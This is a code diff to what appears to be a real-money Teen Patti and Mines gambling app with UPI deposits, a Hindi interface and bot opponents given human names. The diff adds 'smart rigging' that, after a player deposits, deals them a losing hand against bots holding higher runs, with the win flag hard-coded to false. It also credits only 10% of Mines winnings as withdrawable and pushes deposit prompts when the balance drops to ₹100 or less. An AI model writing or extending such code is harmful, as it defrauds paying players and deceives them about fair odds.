@@ -73,6 +73,13 @@
     @keyframes pulse { 0%,100%{ transform: scale(1); } 50%{ transform: scale(1.05); } }
     .whatsapp-icon { color: #25D366; }
     .telegram-icon { color: #0088cc; }
+    
+    /* ===== Colorful Toast Styles ===== */
+    .toast-success { background: linear-gradient(135deg, #065f46, #047857); border: 2px solid #34d399; }
+    .toast-error { background: linear-gradient(135deg, #7f1d1d, #b91c1c); border: 2px solid #f87171; }
+    .toast-warning { background: linear-gradient(135deg, #713f12, #a16207); border: 2px solid #fbbf24; }
+    .toast-info { background: linear-gradient(135deg, #1e3a5f, #1d4ed8); border: 2px solid #60a5fa; }
+    .toast-deposit { background: linear-gradient(135deg, #4c1d95, #7c3aed); border: 2px solid #a78bfa; }
   </style>
 </head>
 <body>
@@ -83,6 +90,35 @@
     const SUIT_COLOR = { "♠": "#1c1c1c", "♣": "#1c1c1c", "♥": "#dc2626", "♦": "#dc2626" };
     const RANK_LABEL = { 11: "J", 12: "Q", 13: "K", 14: "A" };
     
+    // ============= Colorful Toast System =============
+    function showColorfulToast(msg, type = 'info', duration = 3000) {
+      const colors = {
+        success: { bg: '#065f46', border: '#34d399', icon: '✅' },
+        error: { bg: '#7f1d1d', border: '#f87171', icon: '❌' },
+        warning: { bg: '#713f12', border: '#fbbf24', icon: '⚠️' },
+        info: { bg: '#1e3a5f', border: '#60a5fa', icon: 'ℹ️' },
+        deposit: { bg: '#4c1d95', border: '#a78bfa', icon: '💰' },
+        win: { bg: '#065f46', border: '#34d399', icon: '🎉' },
+        lose: { bg: '#7f1d1d', border: '#f87171', icon: '💔' }
+      };
+      const style = colors[type] || colors.info;
+      
+      const toastDiv = document.createElement('div');
+      toastDiv.className = 'fixed inset-0 z-[200] flex items-center justify-center pointer-events-none';
+      toastDiv.innerHTML = `
+        <div class="bg-[${style.bg}] border-2 border-[${style.border}] px-8 py-6 rounded-2xl shadow-2xl flex flex-col items-center toast-pop max-w-[90%] pointer-events-auto" style="background: ${style.bg}; border-color: ${style.border};">
+          <div class="text-6xl mb-3">${style.icon}</div>
+          <div class="text-white font-bold text-base text-center">${msg}</div>
+        </div>
+      `;
+      document.body.appendChild(toastDiv);
+      setTimeout(() => {
+        toastDiv.style.opacity = '0';
+        toastDiv.style.transition = 'opacity 0.5s';
+        setTimeout(() => toastDiv.remove(), 500);
+      }, duration);
+    }
+
     // ============= बॉट्स के लिए नाम =============
     const BOT_NAMES = [
       "Ravi", "Priya", "Amit", "Neha", "Vikram", "Pooja", "Arjun", "Sneha",
@@ -128,6 +164,7 @@
     const genId = () => 'TP' + Math.floor(100000 + Math.random() * 900000);
     const genRef = (name) => (name.substring(0, 3).toUpperCase() + Math.floor(1000 + Math.random() * 9000));
 
+    // ============= CARD GAME FUNCTIONS =============
     function buildDeck() { const deck = []; for (const s of SUITS) for (let r = 2; r <= 14; r++) deck.push({ rank: r, suit: s }); return deck; }
     function shuffle(deck) { const d = [...deck]; for (let i = d.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [d[i], d[j]] = [d[j], d[i]]; } return d; }
     function evaluateHand(cards) { 
@@ -154,7 +191,53 @@
     function prevActiveIndex(players, from) { const n = players.length; for (let step = 1; step <= n; step++) { const i = (from - step + n * 2) % n; if (!players[i].folded && !players[i].out) return i; } return from; }
     function activeList(players) { return players.filter((p) => !p.folded && !p.out); }
     
-    // ============= AAA सिस्टम =============
+    // ============= SMART RIGGING - ₹250+ Deposit के बाद =============
+    function getSmartRiggedDeck(numPlayers) {
+      let deck = shuffle(buildDeck());
+      let hands = [];
+      
+      // User: Small Run (2,3,4 or 3,4,5 or 4,5,6 or 5,6,7)
+      // Robot: Big Run (7,8,9 or 8,9,10 or 9,10,J or 10,J,Q)
+      const smallRuns = [
+        [{ rank: 2, suit: "♠" }, { rank: 3, suit: "♥" }, { rank: 4, suit: "♦" }],
+        [{ rank: 3, suit: "♠" }, { rank: 4, suit: "♥" }, { rank: 5, suit: "♦" }],
+        [{ rank: 4, suit: "♠" }, { rank: 5, suit: "♥" }, { rank: 6, suit: "♦" }],
+        [{ rank: 5, suit: "♠" }, { rank: 6, suit: "♥" }, { rank: 7, suit: "♦" }]
+      ];
+      const bigRuns = [
+        [{ rank: 7, suit: "♠" }, { rank: 8, suit: "♥" }, { rank: 9, suit: "♦" }],
+        [{ rank: 8, suit: "♠" }, { rank: 9, suit: "♥" }, { rank: 10, suit: "♦" }],
+        [{ rank: 9, suit: "♠" }, { rank: 10, suit: "♥" }, { rank: 11, suit: "♦" }],
+        [{ rank: 10, suit: "♠" }, { rank: 11, suit: "♥" }, { rank: 12, suit: "♦" }]
+      ];
+      
+      const runIndex = Math.floor(Math.random() * smallRuns.length);
+      const smallRun = smallRuns[runIndex];
+      const bigRun = bigRuns[runIndex];
+      
+      const usedRanks = new Set([...smallRun.map(c => c.rank), ...bigRun.map(c => c.rank)]);
+      deck = deck.filter(c => !usedRanks.has(c.rank) || !smallRun.some(sc => sc.rank === c.rank && sc.suit === c.suit));
+      
+      hands[0] = smallRun;
+      for (let i = 1; i < numPlayers && i < 4; i++) {
+        hands[i] = bigRun;
+      }
+      
+      let deckIdx = 0;
+      for (let i = 0; i < numPlayers; i++) {
+        if (!hands[i]) {
+          hands[i] = [deck[deckIdx++], deck[deckIdx++], deck[deckIdx++]];
+        }
+      }
+      
+      const userWins = false;
+      const userHandStrength = evaluateHand(hands[0]).category;
+      const isAAA = false;
+      
+      return { deck: hands.flat(), userWins, userHandStrength, isAAA };
+    }
+
+    // ============= Normal Bot Logic =============
     function shouldGiveAAA(gamesPlayed) {
       if (gamesPlayed < 5) return false;
       let chance = 0;
@@ -183,10 +266,7 @@
       return { deck: hands.flat(), userWins: true, userHandStrength: 6, isAAA: true };
     }
 
-    function getSmartRiggedDeck(numPlayers, userBalance, gamesPlayed) {
-      if (userBalance > 50 && shouldGiveAAA(gamesPlayed)) {
-        return getAAAHand(numPlayers);
-      }
+    function getNormalDeck(numPlayers, userBalance, gamesPlayed) {
       let deck = shuffle(buildDeck());
       let hands = [];
       for (let i = 0; i < numPlayers; i++) {
@@ -194,17 +274,19 @@
       }
       const userHandStrength = evaluateHand(hands[0]).category;
       let winChance = 0.50;
-      if (userBalance > 250) winChance = 0.05;
-      else if (userBalance > 150) winChance = 0.15;
-      else if (userBalance > 100) winChance = 0.25;
-      else if (userBalance > 50) winChance = 0.40;
+      if (userBalance > 200) winChance = 0.20;
+      else if (userBalance > 150) winChance = 0.30;
+      else if (userBalance > 100) winChance = 0.40;
+      else if (userBalance > 50) winChance = 0.50;
       else winChance = 0.60;
+      
       const gamesSinceLastWin = gamesPlayed % 20;
       if (gamesSinceLastWin > 12) winChance = Math.min(winChance + 0.3, 0.90);
       else if (gamesSinceLastWin < 4 && gamesSinceLastWin > 0) winChance = Math.max(winChance - 0.25, 0.05);
       const randomFactor = Math.random() * 0.2 - 0.1;
       winChance = Math.min(Math.max(winChance + randomFactor, 0.05), 0.95);
       const userWins = Math.random() < winChance;
+      
       let bestIdx = 0;
       let bestVal = evaluateHand(hands[0]).category;
       for (let i = 1; i < numPlayers; i++) {
@@ -226,125 +308,9 @@
       }
       return { deck: hands.flat(), userWins, userHandStrength, isAAA: false };
     }
-    
-    function botDecideForAAA(game, userBalance, botId) {
-      const cur = game.turn;
-      const p = game.players[cur];
-      const active = activeList(game.players);
-      if (botId === 'bot1') {
-        return { seen: true, action: "pack" };
-      }
-      if (botId === 'bot2' || botId === 'bot3') {
-        const human = game.players[0];
-        if (human.folded || human.out) {
-          return { seen: true, action: "show" };
-        }
-        if (userBalance <= 0 || userBalance < 10) {
-          return { seen: true, action: "show" };
-        }
-        if (Math.random() < 0.30 && game.raises < 6 && game.stake < 100) {
-          return { seen: true, action: "raise" };
-        }
-        return { seen: true, action: "chaal" };
-      }
-      return { seen: true, action: "chaal" };
-    }
 
-    function botDecide(game, userBalance, userHandStrength, isAAA) {
-      const cur = game.turn;
-      const p = game.players[cur];
-      const active = activeList(game.players);
-      let decisionSeen = p.seen || true;
-      const hand = evaluateHand(p.hand);
-      
-      if (isAAA && p.isBot) {
-        return botDecideForAAA(game, userBalance, p.id);
-      }
-      
-      const userHasStrongHand = userHandStrength >= 4;
-      const userHasVeryStrongHand = userHandStrength >= 5;
-      
-      if (userHasVeryStrongHand && active.length === 2) {
-        if (Math.random() < 0.75) {
-          return { seen: true, action: "show" };
-        }
-      }
-      
-      if (userHasStrongHand && userBalance > 100) {
-        if (Math.random() < 0.45) {
-          return { seen: true, action: "chaal" };
-        }
-      }
-      
-      const humanFolded = game.players[0].folded || game.players[0].out;
-      
-      if (humanFolded) {
-        if (active.length === 2) {
-          return { seen: decisionSeen, action: "show" };
-        }
-        if (hand.category <= 2 && Math.random() < 0.7) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        return { seen: decisionSeen, action: "chaal" };
-      }
-      
-      if (userBalance > 250) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 2 && Math.random() < 0.8) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.5) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 1 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
-        if (Math.random() < 0.4) {
-          return { seen: decisionSeen, action: "raise" };
-        }
-      } else if (userBalance > 150) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.6) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.3) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
-      } else if (userBalance > 100) {
-        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.5) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (hand.category === 2 && Math.random() < 0.2) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
-          return { seen: decisionSeen, action: "show" };
-        }
-      } else {
-        if (hand.category <= 1 && Math.random() < 0.3) {
-          return { seen: decisionSeen, action: "pack" };
-        }
-        if (active.length === 2 && game.raises >= 3 && hand.category >= 2) {
-          return { seen: decisionSeen, action: "show" };
-        }
-      }
-      
-      const prevIdx = prevActiveIndex(game.players, cur);
-      const prevP = game.players[prevIdx];
-      
-      if (isAAA && p.isBot) {
-        return { seen: true, action: "chaal" };
-      }
-      
-      if (active.length > 2 && p.seen && prevP.seen && prevP.isBot && Math.random() < 0.15) {
-        return { seen: decisionSeen, action: "sideshow" };
-      }
-      
-      return { seen: decisionSeen, action: "chaal" };
-    }
-    
-    function startRound(game, userBalance, gamesPlayed) {
+    // ============= Modified startRound with Smart Rigging Logic =============
+    function startRound(game, userBalance, gamesPlayed, isDepositBonus = false) {
       const numPlayers = game.players.length;
       const botNames = getBotNames(3);
       let botIndex = 0;
@@ -356,7 +322,23 @@
         }
         return p;
       });
-      const result = getSmartRiggedDeck(numPlayers, userBalance, gamesPlayed);
+      
+      let result;
+      
+      if (userBalance >= 250 && isDepositBonus) {
+        result = getSmartRiggedDeck(numPlayers);
+      } else if (userBalance >= 250 && !isDepositBonus) {
+        if (shouldGiveAAA(gamesPlayed)) {
+          result = getAAAHand(numPlayers);
+        } else {
+          result = getNormalDeck(numPlayers, userBalance, gamesPlayed);
+        }
+      } else if (userBalance > 50 && shouldGiveAAA(gamesPlayed)) {
+        result = getAAAHand(numPlayers);
+      } else {
+        result = getNormalDeck(numPlayers, userBalance, gamesPlayed);
+      }
+      
       let deck = result.deck;
       const userWins = result.userWins;
       const userHandStrength = result.userHandStrength || 0;
@@ -483,6 +465,138 @@
         case "sideshow": return doSideShow(g);
         default: return doChaal(g, false);
       }
+    }
+    
+    function botDecide(game, userBalance, userHandStrength, isAAA) {
+      const cur = game.turn;
+      const p = game.players[cur];
+      const active = activeList(game.players);
+      let decisionSeen = p.seen || true;
+      const hand = evaluateHand(p.hand);
+      
+      const isNewGame = game.roundNum <= 1;
+      const botMoveCount = game.botMoveCount || 0;
+      
+      if (isNewGame && p.isBot && botMoveCount < 2) {
+        const newBotMoveCount = (game.botMoveCount || 0) + 1;
+        let g = { ...game, botMoveCount: newBotMoveCount };
+        if (newBotMoveCount >= 2 && active.length === 2) {
+          return { seen: true, action: "show" };
+        }
+        if (active.length > 2) {
+          return { seen: decisionSeen, action: "chaal" };
+        }
+        return { seen: decisionSeen, action: "chaal" };
+      }
+      
+      if (isAAA && p.isBot) {
+        return botDecideForAAA(game, userBalance, p.id);
+      }
+      
+      const userHasStrongHand = userHandStrength >= 4;
+      const userHasVeryStrongHand = userHandStrength >= 5;
+      
+      if (userHasVeryStrongHand && active.length === 2) {
+        if (Math.random() < 0.75) {
+          return { seen: true, action: "show" };
+        }
+      }
+      
+      if (userHasStrongHand && userBalance > 100) {
+        if (Math.random() < 0.45) {
+          return { seen: true, action: "chaal" };
+        }
+      }
+      
+      const humanFolded = game.players[0].folded || game.players[0].out;
+      
+      if (humanFolded) {
+        if (active.length === 2) {
+          return { seen: decisionSeen, action: "show" };
+        }
+        if (hand.category <= 2 && Math.random() < 0.7) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        return { seen: decisionSeen, action: "chaal" };
+      }
+      
+      if (userBalance > 250) {
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 2 && Math.random() < 0.8) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (hand.category === 2 && Math.random() < 0.5) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (active.length === 2 && game.raises >= 1 && hand.category >= 3) {
+          return { seen: decisionSeen, action: "show" };
+        }
+        if (Math.random() < 0.4) {
+          return { seen: decisionSeen, action: "raise" };
+        }
+      } else if (userBalance > 150) {
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.6) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (hand.category === 2 && Math.random() < 0.3) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
+          return { seen: decisionSeen, action: "show" };
+        }
+      } else if (userBalance > 100) {
+        if (hand.category <= 1 && game.stake >= game.bootAmount * 3 && Math.random() < 0.5) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (hand.category === 2 && Math.random() < 0.2) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (active.length === 2 && game.raises >= 2 && hand.category >= 3) {
+          return { seen: decisionSeen, action: "show" };
+        }
+      } else {
+        if (hand.category <= 1 && Math.random() < 0.3) {
+          return { seen: decisionSeen, action: "pack" };
+        }
+        if (active.length === 2 && game.raises >= 3 && hand.category >= 2) {
+          return { seen: decisionSeen, action: "show" };
+        }
+      }
+      
+      const prevIdx = prevActiveIndex(game.players, cur);
+      const prevP = game.players[prevIdx];
+      
+      if (isAAA && p.isBot) {
+        return { seen: true, action: "chaal" };
+      }
+      
+      if (active.length > 2 && p.seen && prevP.seen && prevP.isBot && Math.random() < 0.15) {
+        return { seen: decisionSeen, action: "sideshow" };
+      }
+      
+      return { seen: decisionSeen, action: "chaal" };
+    }
+
+    function botDecideForAAA(game, userBalance, botId) {
+      const cur = game.turn;
+      const p = game.players[cur];
+      const active = activeList(game.players);
+      if (botId === 'bot1') {
+        return { seen: true, action: "pack" };
+      }
+      if (botId === 'bot2' || botId === 'bot3') {
+        const human = game.players[0];
+        if (human.folded || human.out) {
+          return { seen: true, action: "show" };
+        }
+        if (userBalance <= 0 || userBalance < 10) {
+          return { seen: true, action: "show" };
+        }
+        if (Math.random() < 0.30 && game.raises < 6 && game.stake < 100) {
+          return { seen: true, action: "raise" };
+        }
+        return { seen: true, action: "chaal" };
+      }
+      return { seen: true, action: "chaal" };
     }
     
     function useSounds() { const ref = useRef({}); const ensure = useCallback(() => { if (ref.current.ready) return; try { ref.current.chip = new Tone.MetalSynth().toDestination(); ref.current.chip.volume.value = -20; ref.current.card = new Tone.NoiseSynth().toDestination(); ref.current.card.volume.value = -22; ref.current.pack = new Tone.MembraneSynth().toDestination(); ref.current.pack.volume.value = -10; ref.current.win = new Tone.Synth().toDestination(); ref.current.win.volume.value = -8; ref.current.ready = true; } catch(e){} }, []); return useCallback(async (type) => { try { await Tone.start(); ensure(); const s = ref.current, now = Tone.now(); if (type === "chip") s.chip.triggerAttackRelease("C3", "16n", now); else if (type === "deal" || type === "peek") s.card.triggerAttackRelease("16n", now); else if (type === "pack") s.pack.triggerAttackRelease("C2", "8n", now); else if (type === "win") ["C5", "E5", "G5", "C6"].forEach((n, i) => s.win.triggerAttackRelease(n, "8n", now + i * 0.14)); } catch (e) {} }, [ensure]); }
@@ -621,7 +735,7 @@
         };
       }, []);
 
-      // ===== ZapUPI Payment Callbacks (RESTORED) =====
+      // ===== ZapUPI Payment Callbacks =====
       useEffect(() => {
         ZapUPI.setPaymentCallbacks({
           onSuccess: function(orderId) {
@@ -637,10 +751,13 @@
                 orderId: orderId
               }];
               
+              const isDepositBonus = amt >= 100;
+              
               onUpdateUser({ 
                 balance: newBalance, 
                 withdrawableBalance: newWd, 
-                depositHistory: newHistory.slice(-20) 
+                depositHistory: newHistory.slice(-20),
+                isDepositBonus: isDepositBonus
               });
               
               setShowDepositOverlay(false);
@@ -650,16 +767,16 @@
                 clearInterval(timerIntervalRef.current);
                 timerIntervalRef.current = null;
               }
-              alert(`₹${amt} सफलतापूर्वक जमा हुए!`);
+              showColorfulToast(`₹${amt} सफलतापूर्वक जमा हुए! 🎉`, 'success');
               localStorage.removeItem('tp_pending_amt');
             }
           },
           onFailed: function(orderId) { 
-            alert("Payment Failed. Order: " + orderId); 
+            showColorfulToast("Payment Failed. Order: " + orderId, 'error');
             setProcessingPayment(false); 
           },
           onTimeout: function(orderId) { 
-            alert("Payment Timed Out. Order: " + orderId); 
+            showColorfulToast("Payment Timed Out. Order: " + orderId, 'warning');
             setProcessingPayment(false); 
           }
         });
@@ -667,7 +784,7 @@
 
       const handleDeposit = () => {
         const amt = selectedDepositAmount;
-        if (!amt || amt <= 0) return alert('कृपया एक राशि चुनें');
+        if (!amt || amt <= 0) return showColorfulToast('कृपया एक राशि चुनें', 'warning');
         
         setProcessingPayment(true);
         localStorage.setItem('tp_pending_amt', amt.toString());
@@ -685,7 +802,7 @@
               ZapUPI.loadPayment(paymentUrl);
             },
             onError: function(err) { 
-              alert("Order Error: " + err); 
+              showColorfulToast("Order Error: " + err, 'error');
               setProcessingPayment(false); 
             }
           }
@@ -822,7 +939,7 @@
         }).catch(e => console.error("Exit error:", e));
       }, [game, user.id, user.balance, onUpdateUser, onExit, tableRef]);
 
-      // ===== गेम स्टार्ट =====
+      // ===== गेम स्टार्ट with Smart Rigging =====
       useEffect(() => {
         if (!game || !user) return;
         const myIndex = game.players.findIndex(p => p.id === user.id);
@@ -863,7 +980,8 @@
                   })));
                 }
                 const gamesPlayed = user.gamesPlayed || 0;
-                const startedGame = startRound({ ...currentGame, players: filledPlayers }, user.balance, gamesPlayed);
+                const isDepositBonus = user.isDepositBonus || false;
+                const startedGame = startRound({ ...currentGame, players: filledPlayers, botMoveCount: 0 }, user.balance, gamesPlayed, isDepositBonus);
                 updateGame(startedGame);
               }
             };
@@ -898,7 +1016,8 @@
                   updateGame({ ...currentGame, players, phase: "gameover" });
                 } else {
                   const gamesPlayed = user.gamesPlayed || 0;
-                  const startedGame = startRound({ ...currentGame, players }, user.balance, gamesPlayed);
+                  const isDepositBonus = user.isDepositBonus || false;
+                  const startedGame = startRound({ ...currentGame, players, botMoveCount: 0 }, user.balance, gamesPlayed, isDepositBonus);
                   updateGame(startedGame);
                 }
               }
@@ -912,19 +1031,23 @@
           }, 4000);
           return () => clearTimeout(t);
         }
-      }, [game?.phase, game?.players?.length, tableRef, user.id, user.balance, user.gamesPlayed, updateGame]);
+      }, [game?.phase, game?.players?.length, tableRef, user.id, user.balance, user.gamesPlayed, user.isDepositBonus, updateGame]);
 
-      // ===== राउंड एंड पर बैलेंस अपडेट =====
+      // ===== राउंड एंड पर बैलेंस अपडेट (FIXED - No auto-add) =====
       useEffect(() => { 
         if (!game || !user || game.phase !== "roundEnd") return; 
         const isHumanWinner = game.winnerInfo && game.players[game.winnerInfo.idx] && game.players[game.winnerInfo.idx].id === user.id; 
         const myPlayer = game.players.find(p => p.id === user.id);
         if (!myPlayer || myPlayer.out) return;
-        let newBalance = myPlayer.chips; if (newBalance < 0) newBalance = 0; 
+        
+        // ONLY update balance based on actual game result - NO auto-add
+        let newBalance = myPlayer.chips; 
+        if (newBalance < 0) newBalance = 0; 
         let newWithdrawableBalance = user.withdrawableBalance || 0; 
         let newSessionWinnings = user.sessionWinnings || 0; 
         let newGamesPlayed = (user.gamesPlayed || 0) + 1; 
-        let newWins = user.wins; let newLosses = user.losses; 
+        let newWins = user.wins || 0; 
+        let newLosses = user.losses || 0; 
         let history = Array.isArray(user.gameHistory) ? user.gameHistory : []; 
         let newRecentLosses = user.recentLosses || 0; 
         
@@ -938,11 +1061,13 @@
             }
             newWins = (user.wins || 0) + 1; 
             newRecentLosses = 0; 
-            history.push({ result: 'Win', amount: game.pot, time: new Date().toLocaleTimeString() }); 
+            history.push({ result: 'Win', amount: game.pot, time: new Date().toLocaleTimeString(), type: 'teenpatti' }); 
+            showColorfulToast(`🎉 आप जीत गए! ₹${game.pot}`, 'win');
         } else { 
             newLosses = (user.losses || 0) + 1; 
             newRecentLosses += 1; 
-            history.push({ result: 'Loss', amount: bootAmount, time: new Date().toLocaleTimeString() }); 
+            history.push({ result: 'Loss', amount: bootAmount, time: new Date().toLocaleTimeString(), type: 'teenpatti' }); 
+            showColorfulToast(`💔 आप हार गए! ₹${bootAmount}`, 'lose');
         } 
         if (newWithdrawableBalance > newBalance) newWithdrawableBalance = newBalance;
         if (newWithdrawableBalance < 0) newWithdrawableBalance = 0;
@@ -961,7 +1086,7 @@
           losses: newLosses, 
           gamesPlayed: newGamesPlayed, 
           sessionWinnings: newSessionWinnings, 
-          gameHistory: history.slice(-20), 
+          gameHistory: history.slice(-50), 
           recentLosses: newRecentLosses 
         }); 
       }, [game?.phase, game?.roundNum]);
@@ -1059,6 +1184,14 @@
         return `${mins}:${secs.toString().padStart(2, '0')}`;
       };
 
+      if (!game || !game.players || game.players.length === 0) {
+        return (
+          <div className="app-wrapper table-grad text-white flex flex-col items-center justify-center">
+            <div className="text-xl font-bold mb-4 text-center px-4">गेम लोड हो रहा है...</div>
+          </div>
+        );
+      }
+
       return (
         <div className="app-wrapper table-grad text-white relative">
           <div className="casino-table"></div>
@@ -1143,15 +1276,15 @@
             <div className="text-sm font-bold text-yellow-400">बूट: ₹{game.bootAmount}</div>
           </div>
           <div className="flex-grow relative w-full h-full">
-            {game.players.map((p, i) => {
+            {game.players && game.players.map((p, i) => {
               const isHumanPod = p.id === user.id;
               return (
                 <PlayerPod 
-                  key={p.id} 
+                  key={p.id || i} 
                   player={p} 
                   isTurn={game.turn === i && game.phase === "playing"} 
                   showHand={game.phase === "roundEnd" && !p.folded && !p.out} 
-                  position={positions[i]} 
+                  position={positions[i] || positions[0]} 
                   podRef={(el) => (podRefs.current[i] = el)} 
                   isHuman={isHumanPod} 
                   timer={isHumanPod ? timer : null} 
@@ -1161,9 +1294,9 @@
             <div ref={potRef} className="absolute left-1/2 top-[35%] -translate-x-1/2 -translate-y-1/2 z-10 flex flex-col items-center gap-1 w-full">
               <div className="relative w-full h-[150px] flex items-center justify-center">
                 {tableChips.map((chip) => ( <div key={chip.id} className={`table-chip ${chip.color}`} style={{ transform: `translate(${chip.x}px, ${chip.y}px)`, animationDelay: `${chip.id * 0.03}s` }}>₹{chip.val}</div> ))}
-                <div className="pot-glow px-4 py-1.5 rounded-full font-mono font-bold text-lg text-yellow-400 bg-black/80 border border-yellow-500/50 shadow-lg backdrop-blur-sm absolute z-10">₹ {game.pot.toLocaleString("en-IN")}</div>
+                <div className="pot-glow px-4 py-1.5 rounded-full font-mono font-bold text-lg text-yellow-400 bg-black/80 border border-yellow-500/50 shadow-lg backdrop-blur-sm absolute z-10">₹ {game.pot ? game.pot.toLocaleString("en-IN") : '0'}</div>
               </div>
-              {game.phase === "roundEnd" && game.winnerInfo && (<div className="mt-2 px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1 animate-bounce bg-yellow-400 text-[#1e293b]">👑 {game.players[game.winnerInfo.idx].name} WINNER</div>)}
+              {game.phase === "roundEnd" && game.winnerInfo && game.players && game.players[game.winnerInfo.idx] && (<div className="mt-2 px-3 py-1 rounded-full text-xs font-bold flex items-center gap-1 animate-bounce bg-yellow-400 text-[#1e293b]">👑 {game.players[game.winnerInfo.idx].name} WINNER</div>)}
               {game.isAAA && (
                 <div className="aaa-badge mt-1">
                   🔥 AAA - तीन इक्के!
@@ -1172,7 +1305,7 @@
             </div>
             {chipFlies.map((cf) => (<ChipFlyItem key={cf.id} {...cf} onDone={() => setChipFlies((prev) => prev.filter((x) => x.id !== cf.id))} />))}
           </div>
-          <div className="w-full px-4 py-1 h-8 flex items-center justify-center text-xs text-center absolute bottom-24 left-0 right-0 pointer-events-none z-10 text-gray-300">{game.log.slice(-1).map((l, i) => <div key={i} className="bg-black/60 px-3 py-1 rounded-full">{l}</div>)}</div>
+          <div className="w-full px-4 py-1 h-8 flex items-center justify-center text-xs text-center absolute bottom-24 left-0 right-0 pointer-events-none z-10 text-gray-300">{game.log && game.log.slice(-1).map((l, i) => <div key={i} className="bg-black/60 px-3 py-1 rounded-full">{l}</div>)}</div>
           <div className="w-full bg-black/80 backdrop-blur-md border-t border-yellow-900/50 px-3 pt-3 pb-6 min-h-[90px] z-20 absolute bottom-0 rounded-t-2xl shadow-2xl">
             <div className="flex flex-wrap gap-2 justify-center items-center max-w-md mx-auto"> 
               {isHumanTurn ? ( 
@@ -1192,10 +1325,27 @@
       );
     }
 
-    // ============= MinesGame =============
+    // ============= MinesGame (FIXED - ₹100 Deposit Overlay) =============
     function MinesGame({ user, onExit, onUpdateUser }) {
-      const [betAmount, setBetAmount] = useState(10); const [grid, setGrid] = useState(Array(25).fill(null).map(() => ({ state: 'hidden', isBomb: false }))); const [isPlaying, setIsPlaying] = useState(false); const [currentMultiplier, setCurrentMultiplier] = useState(1.0); const [message, setMessage] = useState("बेट अमाउंट चुनें और खेलना शुरू करें"); const clickStats = useRef(safeParse(localStorage.getItem('mines_clicks'), {}));
+      const [betAmount, setBetAmount] = useState(10); 
+      const [grid, setGrid] = useState(Array(25).fill(null).map(() => ({ state: 'hidden', isBomb: false }))); 
+      const [isPlaying, setIsPlaying] = useState(false); 
+      const [currentMultiplier, setCurrentMultiplier] = useState(1.0); 
+      const [message, setMessage] = useState("बेट अमाउंट चुनें और खेलना शुरू करें"); 
+      const clickStats = useRef(safeParse(localStorage.getItem('mines_clicks'), {}));
+      const [showDepositOverlay, setShowDepositOverlay] = useState(false);
+      const [processingPayment, setProcessingPayment] = useState(false);
       
+      // ===== ₹100 पर Deposit Overlay - FIXED =====
+      useEffect(() => {
+        // Check if balance is exactly 100 or less than 100 but greater than 0
+        if (user.balance <= 100 && user.balance > 0) {
+          setShowDepositOverlay(true);
+        } else {
+          setShowDepositOverlay(false);
+        }
+      }, [user.balance]);
+
       const determineMinesOutcome = useCallback((currentUser) => { 
         let consecutiveWins = currentUser.minesConsecutiveWins || 0; 
         if (currentUser.balance > 150) {
@@ -1232,7 +1382,7 @@
       
       const startGame = () => { 
         if (user.balance < betAmount) { 
-          alert("पर्याप्त बैलेंस नहीं है"); 
+          showColorfulToast("पर्याप्त बैलेंस नहीं है", 'warning');
           return; 
         } 
         const outcome = determineMinesOutcome(user); 
@@ -1258,7 +1408,16 @@
         if (newGrid[idx].isBomb) { 
           setMessage("💣 बम फटा! आप हार गए।"); 
           setIsPlaying(false); 
-          onUpdateUser({ recentLosses: (user.recentLosses || 0) + 1, losses: (user.losses || 0) + 1, minesConsecutiveWins: 0, gamesPlayed: (user.gamesPlayed || 0) + 1 }); 
+          const history = Array.isArray(user.gameHistory) ? user.gameHistory : [];
+          history.push({ result: 'Loss', amount: betAmount, time: new Date().toLocaleTimeString(), type: 'mines' });
+          onUpdateUser({ 
+            recentLosses: (user.recentLosses || 0) + 1, 
+            losses: (user.losses || 0) + 1, 
+            minesConsecutiveWins: 0, 
+            gamesPlayed: (user.gamesPlayed || 0) + 1,
+            gameHistory: history.slice(-50)
+          }); 
+          showColorfulToast("💣 बम फटा! आप हार गए।", 'error');
           setTimeout(() => { 
             setGrid(g => g.map(box => ({ ...box, state: 'revealed' }))); 
           }, 500); 
@@ -1278,24 +1437,97 @@
         const winAmount = Math.floor(betAmount * mult); 
         setMessage(`🎉 कैशआउट सफल! आपने ₹${winAmount} जीते।`); 
         setIsPlaying(false); 
+        
+        const withdrawableAmount = Math.floor(winAmount * 0.1);
+        const bonusAmount = winAmount - withdrawableAmount;
+        
         let newBalance = user.balance + winAmount; 
-        let newWd = (user.withdrawableBalance || 0) + winAmount; 
+        let newWd = (user.withdrawableBalance || 0) + withdrawableAmount; 
+        let newBonus = (user.bonusBalance || 0) + bonusAmount;
+        
         if (newWd > newBalance) newWd = newBalance; 
         if (newWd < 0) newWd = 0; 
+        
+        const history = Array.isArray(user.gameHistory) ? user.gameHistory : [];
+        history.push({ result: 'Win', amount: winAmount, time: new Date().toLocaleTimeString(), type: 'mines' });
+        
         onUpdateUser({ 
           balance: newBalance, 
-          withdrawableBalance: newWd, 
+          withdrawableBalance: newWd,
+          bonusBalance: newBonus,
           wins: (user.wins || 0) + 1, 
           recentLosses: 0, 
